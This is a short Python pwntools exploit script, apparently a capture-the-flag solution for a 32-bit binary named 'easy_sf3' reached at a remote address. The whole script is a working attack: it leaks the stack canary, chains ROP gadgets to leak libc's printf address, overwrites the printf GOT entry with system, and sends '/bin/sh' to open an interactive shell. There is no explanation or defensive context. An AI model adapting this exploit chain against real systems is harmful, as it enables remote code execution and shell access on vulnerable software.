from pwn import*
#p = process('./easy_sf3')

p = remote('35.194.245.237',8081)

# gadget
plt_read = 0x8048390
plt_printf = 0x80483A0
got_printf = 0x804A010
pr = 0x08048379
pppr = 0x08048609

# canary leak
pay = ''
pay += 'a'*0x21
p.send(pay)

p.recvuntil('> your data : ')
p.recv(0x21)
Canary = u32('\x00'+p.recv(3))
print hex(Canary)
p.recv()

# libc leak
pay = ''
pay += 'a'*0x20
pay += p32(Canary)      # canary
pay += 'b'*0x8          # padding
pay += 'c'*0x4          # sfp
pay += p32(plt_printf)  # ret
pay += p32(pr)
pay += p32(got_printf)

# exploit
pay += p32(plt_read)
pay += p32(pppr)
pay += p32(0)
pay += p32(got_printf)
pay += p32(0x10)	# -- wait

pay += p32(plt_printf)
pay += p32(pr)
pay += p32(got_printf+0x4)
p.send(pay)

libc_printf = u32(p.recv(4))

libc_base = libc_printf - 0x49670
libc_system = libc_printf - 0xe6e0
#libc_system = libc_base + 0x3ada0
print hex(libc_system)
print hex(libc_printf)

p.sendline(p32(libc_system)+'/bin/sh\x00')
			# -- go
p.interactive()
